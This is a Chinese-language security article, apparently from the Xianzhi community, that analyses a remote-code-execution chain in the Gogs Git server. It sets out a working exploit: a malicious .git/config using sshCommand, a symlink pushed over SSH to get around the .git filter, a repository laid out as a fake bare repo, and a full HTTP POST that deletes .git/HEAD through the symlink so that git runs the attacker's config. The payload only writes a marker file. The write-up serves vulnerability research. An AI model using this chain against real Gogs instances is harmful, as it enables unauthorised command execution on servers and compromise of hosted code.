# Gogs最新RCE分析与利用详情-先知社区

> **来源**: https://xz.aliyun.com/news/18409  
> **文章ID**: 18409

---

在讲解漏洞原因之前首先需要了解一下Gogs是个什么系统，以及一些重要的前置知识，这些知识放在一起最终导致了这个漏洞的产生。

# Gogs背景介绍

Gogs（Go Git Service）是一款用Go语言编写的轻量级、开源的Git仓库托管系统。它的设计目标是让搭建和维护Git服务变得简单、快速，同时提供类似GitHub的功能，但对资源消耗更少，适合个人或者小型团队使用，**支持注册（所有注册功能开放，就可以在合法情况下，测试这个漏洞）**。

Gogs的核心是托管Git仓库，通过其 Web 界面和 API 为用户提供友好的操作体验。简单来说，它的工作流程包括：

1. 仓库管理：用户在Gogs中创建、克隆、推送或拉取Git仓库，仓库存储在服务器的文件系统或数据库中。
2. 用户认证：支持多种登录方式，包括本地账号、LDAP、OAuth等，确保权限控制。
3. Web界面交互：用户通过Web界面或API进行仓库管理、代码浏览、Issue跟踪、Pull Request等操作。
4. Git协议处理：Gogs监听Git协议（如SSH、HTTP/HTTPS），处理用户的git clone、push等请求，将操作同步到仓库存储。
5. 后端服务：Gogs的后端实现了各种功能模块，包括用户管理、权限控制、通知、Wiki等。

也就是说它背后是通过git命令来进行仓库的管理的。

# Git的秘密

首先git不仅仅可以进行代码、仓库的管理，它其实也是可以进行本地命令执行的，这也是这个漏洞最后的sink点。来看看git是如何进行命令执行的。

当提交执行git命令的时候，也就是执行 git <command>的时候，Git解析命令并定位到对应可执行文件，其中在.git目录下有一个config文件，用来进行仓库配置。

![image.png](images/20260326203420-1ce30563-2910-1.png)

当在config的[core] 核心配置中有含有sshCommand的时候就会进行本地的命令执行。

以下是恶意的config配置内容。

```
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
ignorecase = true
precomposeunicode = true
sshCommand = echo test > /tmp/poc
[remote "origin"]
url = [git@github.com](test:git@github.com):test/linux.git
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
remote = origin
merge = refs/heads/master
```

可以进行一下实验，将原来.git目录下的config文件内容修改为我们的恶意配置，然后再通过gogs webui 进行仓库的一些修改，使其后端执行git命令。

![image.png](images/20260326203421-1d2e087d-2910-1.png)

在提交变更之后命令执行了 并且web ui也报错了，因为原始config文件被修改了，无法正常操作仓库了，不过命令是执行了，这是我们的目的。至于为什么我只是echo test 后面却跟了一串其他内容 这应该是sshCommand的一些知识了，这里不做深究。

![image.png](images/20260326203421-1d749e46-2910-1.png)

虽然git可以进行命令执行了，但是我们要想通过gogs系统进行命令执行的话，还需要配合文件写入漏洞，使得可以修改.git/config文件的内容导致命令执行。历史上gogs是也是有这个漏洞的。

​

但是今年爆的这个漏洞是通过任意文件删除造成的命令执行，这里就需要引出git的另一个机制了。git在提交命令的时候，之前说了会去看.git目录下的文件，只有满足一些条件的时候，git才会将其该目录识别为标准仓库，才会去执行config中的命令，然而当我们删除了一个HEAD文件或是其他需要匹配的文件时，Git不再将该目录识别为标准仓库，转而会去向上寻找根目录，去判断根目录是否符合标准仓库，那么如果根目录符合git的匹配规则，让其认为是标准仓库目录，该目录下放了我们的恶意config，那么就会造成命令执行了。所以我们需要通过任意文件删除漏洞来删除原始.git目录下的一些文件，来破坏其原有的文件完整性。

# 另类任意文件删除

通常我们所见的任意文件删除，是通过目录穿越 ../../这样进行的，实际上在<0.13.1的gogs中也有用到一些目录穿越，在>=0.13.1的时候似乎修复了。

![image.png](images/20260326203421-1db5e1f0-2910-1.png)

而最新的gogs任意文件删除，使用的并不是这样的目录穿越，这时候就需要引入另外一个技巧了，叫符号链接

符号链接（软链接）是Linux文件系统中的特殊文件类型，其本质是指向另一个文件/目录的快捷方式。

创建符号链接的命令如下

```
ln -s <目标路径> <链接名称>  
```

案例如下

```
# 攻击者创建恶意链接
ln -s /etc/passwd malicious-link

# 程序执行删除操作（以用户提供路径为参数）
delete_file("malicious-link")  # 实际删除/etc/passwd！
```

如果是这样创建符号链接呢

```
ln -s .git true_git_dir
```

我们在使用gogs删除文件时删除true\_git\_dir/HEAD 原始.git目录完整性被破坏就会向上级目录找

而上级目录其实就是我们可以正常上传的仓库文件，如果文件是符合条件的那么就可以达到我们之前想要的效果了。

![image.png](images/20260326203422-1dec9e04-2910-1.png)

当然有人会问为什么不直接删除.git/HEAD 因为之前其他漏洞修复已经对.git进行了过滤 以阻止直接删除.git目录，转而需要引用符号链接来绕过防护，所以实际上最新的gogs RCE是之前的绕过

![image.png](images/20260326203422-1e231c20-2910-1.png)

# 如何上传symlink

那么我们既然要上传一个符号链接文件，需要用到git去push到仓库中去 可以用http也可以用ssh，我这里用ssh

首先添加ssh公钥 即id\_rsa.pub（系统支持注册账号，测试人员可以注册账号测试漏洞0.0）

![image.png](images/20260326203423-1e639f9f-2910-1.png)添加之后就可以正确对仓库进行git操作了

![image.png](images/20260326203423-1e9d0f07-2910-1.png)不添加会报错如下

![image.png](images/20260326203423-1edb6002-2910-1.png)

然后本地攻击机（kali）创建一个符号链接，一定要用linux系统，创建符号链接，然后push到仓库，因为linux的符号链接在windows上处理不了，这也是个坑当我尝试把linux的符号链接文件复制到windows的时候发送如下提示。

![image.png](images/20260326203424-1f0dee42-2910-1.png)

那么我们在linux 攻击机上面执行如下命令

```
ssh://git@192.168.11.61:10022/admin1/tset.git
cd tset
ln -s .git true_git_dir
```

![image.png](images/20260326203424-1f47d095-2910-1.png)

```
git add true_git_dir
```

![image.png](images/20260326203424-1f818798-2910-1.png)

```
git push origin master
```

![image.png](images/20260326203425-1fba26be-2910-1.png)

至此成功向仓库上传了一个symlink文件

![image.png](images/20260326203425-1ff5dc1a-2910-1.png)

如果想在windows上面去post上传一个symlink文件是不行的，即使把linux上的符号链接文件下载下来，上传上去，由于经过了windows的处理导致它不再是linux symlink文件而只是普通文件了，所以也是不行的，真正上传符号链接文件之后这里的icon如图所示。

​

不过只有这个符号链接，仓库里的文件并不符合标准仓库目录的匹配，我们需要当前仓库目录树 形如下

```
malicious-repo/
├── HEAD                  # 根目录下的HEAD
├── config                # 根目录下的恶意config
├── refs/heads/       # 分支引用
├── objects/...           # 空对象目录
├── info/...              # 其他元数据
├── .git/...              # 原始.git目录（后续将被破坏）
└── README.md             # 伪装文件
```

![9a225d089f5ecc0897ce7b2c86ccb0d.jpg](images/20260326203426-20430cd0-2910-1.png)

我们可以自己在github上面创建一个这样的项目（文件的内容也需要符号git的规则，可以随便拉一个项目然后修改它的.git目录，项目里一般都有这些文件） 然后git clone到本地 添加符号链接然后 push到gogs上面

# 漏洞触发

目录已经构造好了，接下来我们要破坏原始.git目录的完整性了 也就是需要删除.git/HEAD

(测试发现没有 description 和 index也是可以的)

![image.png](images/20260326203426-208bc66d-2910-1.png)

当然这里config中的内容需要是恶意的

![image.png](images/20260326203427-20c8be18-2910-1.png)

我们随便删一个文件 然后抓包（不是真的删）

![image.png](images/20260326203427-21065524-2910-1.png)

然后修改为如下url：http://192.168.11.61:10880/admin1/tset/\_delete/master/true\_git\_dir/HEAD即指向的是.git下的HEAD而不是当前仓库里的HEAD 然后右边就会提示删除时发生了错误

原因也很简单，因为原始git目录的HEAD被成功删除，完整性被破坏，执行git命令的时候也就报错，最终再ui上体现如截图所示

![image.png](images/20260326203427-21464c55-2910-1.png)

```
POST /admin1/tset/_delete/master/true_git_dir/HEAD HTTP/1.1
Host: 192.168.11.61:10880
Content-Type: application/x-www-form-urlencoded
Cookie: lang=zh-CN; i_like_gogs=e4273ca0fe129938; gogs_awesome=admin1; gogs_incredible=7adbdcb1e2749458125bfb817c73c1e3802f77ed88e79a11d1a0c6561cfa06b064ae
Content-Length: 130

_csrf=H3SRKyUjzJsxUgTJqttujDb4s4Q6MTc1MTcwODYxNjQ3MDk2MjA5MA&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=
```

然后我们在随便找个提交的地方 提交一下，使得后端能够执行git命令触发漏洞

![image.png](images/20260326203428-217fbef0-2910-1.png)

当然也是会报错的

![image.png](images/20260326203428-21b4ab46-2910-1.png)

不过命令也已经正常执行了

![image.png](images/20260326203429-21e95b67-2910-1.png)

至此漏洞讲解完了，这个漏洞很巧妙的将git机制、符号链接、任意文件删除漏洞用到了极致。

# 测试过程中的版本确定

在合法测试过程中可以通过报错来判断版本是否满足漏洞版本 这里尝试通过符号链接去测试任意文件读取，不过这个有对符号链接的过滤导致无法任意文件读取，然后就报500了，下面也是将版本号泄露了

![image.png](images/20260326203429-2229166b-2910-1.png)
